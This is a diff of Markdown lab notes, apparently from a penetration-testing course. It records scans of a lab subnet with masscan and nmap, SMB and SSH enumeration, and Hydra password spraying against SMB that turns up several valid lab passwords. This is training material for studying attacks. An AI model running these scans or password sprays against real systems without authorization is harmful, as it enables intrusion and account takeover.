+banner tcp 25 10.130.10.25 1727151706 X509 MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWhcNMjkwOTExMjM1NTUyWjARMQ8wDQYDVQQDEwZtYWlsMDEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF/T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2NJg7W5kTcFp6fBfCdAKBZk79f+8udN4gKCVJf+YcUIeyKpezziGdbQXowAGI5KhXM21iwbKMrDVW/Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=
+banner tcp 25 10.130.10.25 1727151706 smtp 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:21:14 +0000\x0a250-mail01.hiboxy.com Hello [10.254.252.3]\x0a250-SIZE 37748736\x0a250-PIPELINING\x0a250-DSN\x0a250-ENHANCEDSTATUSCODES\x0a250-STARTTLS\x0a250-X-ANONYMOUSTLS\x0a250-AUTH NTLM\x0a250-X-EXPS GSSAPI NTLM\x0a250-8BITMIME\x0a250-BINARYMIME\x0a250-CHUNKING\x0a250-SMTPUTF8\x0a250 XRDST\x0a220 2.0.0 SMTP server ready
+sec560@560vm:~/Downloads$ 
 
 ```
 
+#### 7: Extracting Live Hosts and Ports
+
+```
+sec560@560vm:~/Downloads$ head /tmp/masscan_10.130.10.0_24_full.gnmap
+# Masscan 1.3.9-integration scan initiated Tue Sep 24 04:18:39 2024
+# Ports scanned: TCP(0;) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Timestamp: 1727151519	Host: 10.130.10.11 ()	Ports: 80/open/tcp//http//
+Timestamp: 1727151523	Host: 10.130.10.6 ()	Ports: 80/open/tcp//http//
+Host: 10.130.10.11 ()	Port: 80	Service: http.server	Banner: nginx/1.24.0 (Ubuntu)
+Host: 10.130.10.11 ()	Port: 80	Service: title	Banner: Welcome to nginx!
+Host: 10.130.10.11 ()	Port: 80	Service: http	Banner: HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d
+Timestamp: 1727151524	Host: 10.130.10.21 ()	Ports: 3389/open/tcp//ms-wbt-server//
+Host: 10.130.10.6 ()	Port: 80	Service: http.server	Banner: Microsoft-IIS/10.0
+Host: 10.130.10.6 ()	Port: 80	Service: title	Banner: IIS Windows Server
+sec560@560vm:~/Downloads$ 
+```
+
+```
+sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $4}' | sort -uV
+10.130.10.4
+10.130.10.5
+10.130.10.6
+10.130.10.7
+10.130.10.10
+10.130.10.11
+10.130.10.21
+10.130.10.22
+10.130.10.23
+10.130.10.25
+10.130.10.33
+10.130.10.44
+10.130.10.45
+sec560@560vm:~/Downloads$ 
+```
+
+```
+sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | sort -uV | head
+22/open/tcp//ssh//
+23/open/tcp//telnet//
+25/open/tcp//smtp//
+53/open/tcp//domain//
+80/open/tcp//http//
+135/open/tcp//epmap//
+139/open/tcp//netbios-ssn//
+389/open/tcp//ldap//
+443/open/tcp//https//
+444/open/tcp//snpp//
+sec560@560vm:~/Downloads$ 
+```
+
+```
+sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | cut -d '/' -f 1 | sort -un
+22
+23
+25
+53
+80
+135
+139
+389
+443
+444
+445
+464
+465
+475
+476
+477
+587
+636
+717
+808
+890
+1433
+1801
+2103
+2105
+2107
+2525
+3268
+3269
+3389
+3875
+5985
+5986
+6402
+6536
+6564
+8172
+9389
+64337
+sec560@560vm:~/Downloads$ 
+```
+
+```
+sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//' > /tmp/10.130.10.0_24_openports.txt
+sec560@560vm:~/Downloads$ cat /tmp/10.130.10.0_24_openports.txt
+22,23,25,53,80,135,139,389,443,444,445,464,465,475,476,477,587,636,717,808,890,1433,1801,2103,2105,2107,2525,3268,3269,3389,3875,5985,5986,6402,6536,6564,8172,9389,64337sec560@560vm:~/Downloads$ 
+```
+
 ## Lab 1.4: Nmap
+
+### linux
+
+#### 1: Initial Scan
 
 ```
 sec560@560vm:~/Downloads$ nmap -n 10.130.10.1-10
@@ -304,6 +445,7 @@ Nmap done: 10 IP addresses (3 hosts up) scanned in 55.57 seconds
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 2: Scanning 10.130.10.33
 
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -sT 10.130.10.33 -F
@@ -320,7 +462,7 @@ sec560@560vm:~/Downloads$
 
 ```
 
-他のタブでリッスンする
+新しいターミナルウィンドウを起動し、そのウィンドウでスニッファを実行してパケットを監視
 
 ```
 sec560@560vm:~/Downloads$ sudo tcpdump -i tun0 -nn net 10.130.10.0/24
@@ -354,6 +496,8 @@ Nmap done: 1 IP address (1 host up) scanned in 21.35 seconds
 sec560@560vm:~/Downloads$ 
 
 ```
+
+#### 3: Output Formats
 
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -sT 10.130.10.0/24 -oA /tmp/scan -F -T4
@@ -522,6 +666,8 @@ sec560@560vm:~/Downloads$
 
 ```
 
+#### 4: Finding Hosts by Open Port
+
 ```
 sec560@560vm:~/Downloads$ grep 389/open /tmp/scan.gnmap
 Host: 10.130.10.4 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (93)
@@ -560,6 +706,8 @@ sec560@560vm:~/Downloads$ grep -w 445/open /tmp/scan.gnmap | cut -d ' ' -f 2
 10.130.10.44
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 5: The nmap-services File
 
 ```
 sec560@560vm:~/Downloads$ sudo ls -la /usr/share/nmap/nmap-services
@@ -615,6 +763,8 @@ systat  11/tcp  0.000075        # Active Users
 
 ```
 
+#### 5: The nmap-services File
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -sU 10.130.10.10
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:55 UTC
@@ -664,6 +814,10 @@ sec560@560vm:~/Downloads$
 ```
 
 ## Lab 2.1 - Version Scanning, OS Detection, NSE, and GoWitness
+
+### Linux
+
+#### 1: The nmap-service-probes File
 
 ```
 sec560@560vm:~/Downloads$ sudo ls -la /usr/share/nmap/nmap-service-probes
@@ -745,6 +899,8 @@ match ftp m|^220 ([-\w_.]+) FTP server ready \(mod_ftpd/([\d.]+)\)\r\n| p/Apache
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 2: Version scan of .25
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -p 25 10.130.10.25
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:03 UTC
@@ -772,6 +928,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
 sec560@560vm:~/Downloads$
 ```
+
+#### 3: Examining a Service with Netcat
 
 ```
 sec560@560vm:~/Downloads$ nc -nv 10.130.10.25 25
@@ -826,6 +984,8 @@ quit
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 4: Version Scan of .10
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -F 10.130.10.10
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:27 UTC
@@ -861,6 +1021,8 @@ sec560@560vm:~/Downloads$
 
 ```
 
+#### 4: Version Scan of .10
+
 ```
 sec560@560vm:~/Downloads$ head /usr/share/nmap/scripts/script.db
 Entry { filename = "acarsd-info.nse", categories = { "discovery", "safe", } }
@@ -892,6 +1054,8 @@ grep intrusive /usr/share/nmap/scripts/script.db | wc -l
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 6: The ssh-auth-methods Script
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n --open -F --script=ssh-auth-methods 10.130.10.10
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:31 UTC
@@ -920,6 +1084,8 @@ SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 7: Examining the ssh-auth-methods Script
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n --open -F --script=ssh-auth-methods 10.130.10.10 -sV
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:33 UTC
@@ -946,6 +1112,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 8: SMB Scripts
 
 ```
 sec560@560vm:~/Downloads$ ls /usr/share/nmap/scripts/smb*.nse
@@ -1034,6 +1202,8 @@ sec560@560vm:~/Downloads$
 
 `--script-args=smbuser=ADMIN_USER,smbpass=ADMIN_PASSWORD,config=CONFIG_FILE_NAME`
 
+#### 9: The smb2-security-mode Script
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -PS445 -p 445 --script=smb2-security-mode --open 10.130.10.0/24
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:36 UTC
@@ -1119,6 +1289,8 @@ sec560@560vm:~/Downloads$
 
 ```
 
+#### 10: The smb-protocols Script
+
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -PS445 -p 445 --open --script=smb-protocols 10.130.10.4,44
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:37 UTC
@@ -1156,6 +1328,8 @@ Host script results:
 Nmap done: 2 IP addresses (2 hosts up) scanned in 14.40 seconds
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 11: OS Fingerprinting
 
 ```
 sec560@560vm:~/Downloads$ sudo nmap -n -F -O 10.130.10.4,10,44
@@ -1333,6 +1507,8 @@ sec560@560vm:~/Downloads$
 
 ```
 
+#### 12: Better OS Fingerprinting Techniques
+
 ```
 sec560@560vm:~/Downloads$ ls -1 /usr/share/nmap/scripts/*ntlm*
 /usr/share/nmap/scripts/http-ntlm-info.nse
@@ -1435,6 +1611,8 @@ SMB         10.130.10.5     445    WEB01            [*] Windows Server 2022 Buil
 Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 13: HTTP NSE Scripts
 
 ```
 sec560@560vm:~/Downloads$ sudo nmap -v -p*http* -oG -
@@ -1865,6 +2043,8 @@ PORT    STATE SERVICE
 Nmap done: 256 IP addresses (6 hosts up) scanned in 14.91 seconds
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 14: GoWitness
 
 ```
 sec560@560vm:~/Downloads$ mkdir gowitness && cd gowitness
@@ -3319,6 +3499,45 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:36:
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:37:08
 sec560@560vm:~/Downloads$
+```
+
+```
+sec560@560vm:~/Downloads$ hydra -L domainusers.txt -P ./pass.txt -m workgroup:{hiboxy} 10.130.10.4 smb2
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 04:23:54
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11440 login tries (l:572/p:20), ~715 tries per task
+[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
+[STATUS] 579.00 tries/min, 579 tries in 00:01h, 10861 to do in 00:19h, 16 active
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: alee   password: Winter2026
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: bsanchez   password: Winter2026!
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: bwebster   password: Winter2026
+[STATUS] 581.33 tries/min, 1744 tries in 00:03h, 9696 to do in 00:17h, 16 active
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: hmarsh   password: Autumn2026
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: janderson   password: Spring2026
+[STATUS] 580.43 tries/min, 4063 tries in 00:07h, 7377 to do in 00:13h, 16 active
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: jlopez   password: Autumn2026!
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: kacevedo   password: Winter2026!
+[STATUS] 580.83 tries/min, 6970 tries in 00:12h, 4470 to do in 00:08h, 16 active
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: mluna   password: Autumn2026
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: nlopez   password: Spring2026
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: rduran   password: Winter2026!
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: ssmith   password: Spring2026!
+[STATUS] 580.76 tries/min, 9873 tries in 00:17h, 1567 to do in 00:03h, 16 active
+1 of 1 target successfully completed, 11 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 04:43:36
+sec560@560vm:~/Downloads$ 
 ```
 
 ## Lab 2.3: Azure Recon and Password Attacks
